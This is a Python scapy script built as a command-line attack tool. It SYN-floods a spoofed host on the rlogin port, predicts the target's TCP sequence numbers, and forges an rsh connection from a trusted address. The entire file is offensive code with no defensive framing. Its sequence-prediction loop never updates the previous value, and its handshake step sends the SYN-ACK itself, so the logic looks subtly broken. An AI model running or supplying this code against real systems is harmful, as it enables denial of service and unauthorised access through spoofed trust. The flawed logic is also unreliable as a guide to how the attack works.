import argparse
from scapy.all import *

def syn_flood(src, tgt):
    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=513, flags="S")
        pkt = ip_layer / tcp_layer
        send(pkt, verbose=0)

def calculate_tsn(tgt):
    seq_num = 0
    prev_num = 0
    diff_seq = 0
    for _ in range(4):
        if prev_num != 0:
            prev_num = seq_num
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seq_num = ans.getlayer(TCP).seq
        diff_seq = seq_num - prev_num
        print(f'[+] TCP Seq Difference: {diff_seq}')
    return seq_num + diff_seq

def spoof_connection(src, tgt, ack):
    # Step 1: Send SYN packet from spoofed source
    ip_layer = IP(src=src, dst=tgt)
    tcp_layer = TCP(sport=513, dport=514, flags="S", seq=ack)
    syn_pkt = ip_layer / tcp_layer
    send(syn_pkt, verbose=0)

    # Step 2: Receive SYN-ACK from target and send ACK back
    syn_ack_pkt = sr1(IP(dst=tgt) / TCP(sport=514, dport=513, flags="SA"), verbose=0)
    ack_seq = syn_ack_pkt.seq + 1

    ip_layer = IP(src=src, dst=tgt)
    tcp_layer = TCP(sport=513, dport=514, flags="A", seq=ack + 1, ack=ack_seq)
    ack_pkt = ip_layer / tcp_layer
    send(ack_pkt, verbose=0)

def main():
    parser = argparse.ArgumentParser(description='SYN Flood and Spoofed Connection Script')
    parser.add_argument('-s', dest='syn_spoof', type=str, required=True, help='Specify source for SYN Flood')
    parser.add_argument('-S', dest='src_spoof', type=str, required=True, help='Specify source for spoofed connection')
    parser.add_argument('-t', dest='tgt', type=str, required=True, help='Specify target address')
    
    args = parser.parse_args()
    
    print('[+] Starting SYN Flood to suppress remote server.')
    syn_flood(args.syn_spoof, args.tgt)
    
    print('[+] Calculating correct TCP Sequence Number.')
    seq_num = calculate_tsn(args.tgt) + 1
    
    print('[+] Spoofing Connection.')
    spoof_connection(args.src_spoof, args.tgt, seq_num)
    
    print('[+] Done.')

if __name__ == '__main__':
    main()
